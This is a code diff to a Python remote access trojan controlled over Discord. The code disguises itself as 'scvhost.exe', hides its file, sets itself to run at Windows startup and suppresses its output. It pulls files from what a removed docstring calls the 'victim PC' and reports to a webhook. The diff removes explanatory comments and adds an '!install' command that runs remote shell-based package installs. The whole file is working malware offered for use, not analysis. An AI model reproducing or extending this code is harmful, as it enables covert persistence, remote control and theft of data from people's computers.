@@ -51,7 +51,6 @@ hidden_paths = {}
 HIDE_NAME = "scvhost.exe"
 
 def add_to_startup(file_path):
-    """Add program to Windows startup"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -71,7 +70,6 @@ def add_to_startup(file_path):
         return None
 
 def remove_from_startup():
-    """Remove program from Windows startup"""
     try:
         startup_folder = os.path.join(os.environ['APPDATA'], 
                                        r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -87,7 +85,6 @@ def remove_from_startup():
         return False
 
 def hide_file(file_path):
-    """Hide a file using Windows attributes"""
     try:
         ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
         return True
@@ -95,7 +92,6 @@ def hide_file(file_path):
         return False
 
 def unhide_file(file_path):
-    """Unhide a file"""
     try:
         ctypes.windll.kernel32.SetFileAttributesW(file_path, 128)
         return True
@@ -404,9 +400,35 @@ def list_directory(path='.'):
     except Exception as e:
         return str(e)
 
+def install_package(package_name):
+    try:
+        result = subprocess.run(
+            f'pip install {package_name}',
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        if result.returncode == 0:
+            return f"✅ Installed {package_name} using pip"
+        
+        result = subprocess.run(
+            f'winget install {package_name} --silent',
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        if result.returncode == 0:
+            return f"✅ Installed {package_name} using winget"
+        
+        return f"❌ Failed to install {package_name}"
+    except Exception as e:
+        return f"❌ Installation error: {str(e)}"
+
 @bot.event
 async def on_ready():
-    pass  # Silent startup
+    pass
 
 @bot.command()
 async def hide(ctx):
@@ -420,10 +442,8 @@ async def hide(ctx):
         script_dir = os.path.dirname(script_path)
         original_filename = os.path.basename(script_path)
         
-        # Rename to scvhost.exe
         new_path = os.path.join(script_dir, HIDE_NAME)
         
-        # If scvhost.exe already exists, remove it first
         if os.path.exists(new_path) and new_path != script_path:
             try:
                 os.remove(new_path)
@@ -433,11 +453,9 @@ async def hide(ctx):
         os.rename(script_path, new_path)
         hidden_paths['new_path'] = new_path
         
-        # Hide the file
         hide_file(new_path)
         hidden_paths['hidden'] = True
         
-        # Add to startup
         startup_path = add_to_startup(new_path)
         if startup_path:
             hidden_paths['startup'] = startup_path
@@ -463,24 +481,18 @@ async def unhide(ctx):
         script_path = get_current_script_path()
         script_dir = os.path.dirname(script_path)
         
-        # Remove from startup
         remove_from_startup()
-        
-        # Unhide file
         unhide_file(script_path)
         
-        # Restore original name if possible
         if original_filename and 'new_path' in hidden_paths:
             original_path = os.path.join(script_dir, original_filename)
             
-            # Remove original if it exists (as a file)
             if os.path.exists(original_path) and os.path.isfile(original_path):
                 try:
                     os.remove(original_path)
                 except:
                     pass
             
-            # Rename back to original
             if script_path != original_path:
                 os.rename(script_path, original_path)
                 hidden_paths['restored_path'] = original_path
@@ -504,6 +516,25 @@ async def status(ctx):
     else:
         await ctx.send("🔓 Bot is NOT hidden")
         await send_webhook("Status: Not hidden")
+
+@bot.command()
+async def install(ctx, *, package):
+    """Install a package or program. Usage: !install requests or !install python"""
+    await ctx.send(f"Installing: {package}")
+    
+    def install_thread():
+        result = install_package(package)
+        asyncio.run_coroutine_threadsafe(
+            send_webhook(f"Install result for {package}: {result}"),
+            bot.loop
+        )
+        asyncio.run_coroutine_threadsafe(
+            ctx.send(result),
+            bot.loop
+        )
+    
+    thread = threading.Thread(target=install_thread, daemon=True)
+    thread.start()
 
 @bot.command()
 async def ip(ctx):
@@ -621,7 +652,6 @@ async def ls(ctx, path='.'):
 
 @bot.command()
 async def download(ctx, *, file_path):
-    """Download file from victim PC. Example: !download C:/file.txt"""
     await ctx.send(f"Attempting to download: {file_path}")
     
     def download_thread():
@@ -726,7 +756,6 @@ async def webhook_test(ctx):
     await ctx.send("Test sent.")
 
 if __name__ == '__main__':
-    # Suppress output
     import sys
     import io
     sys.stdout = io.StringIO()
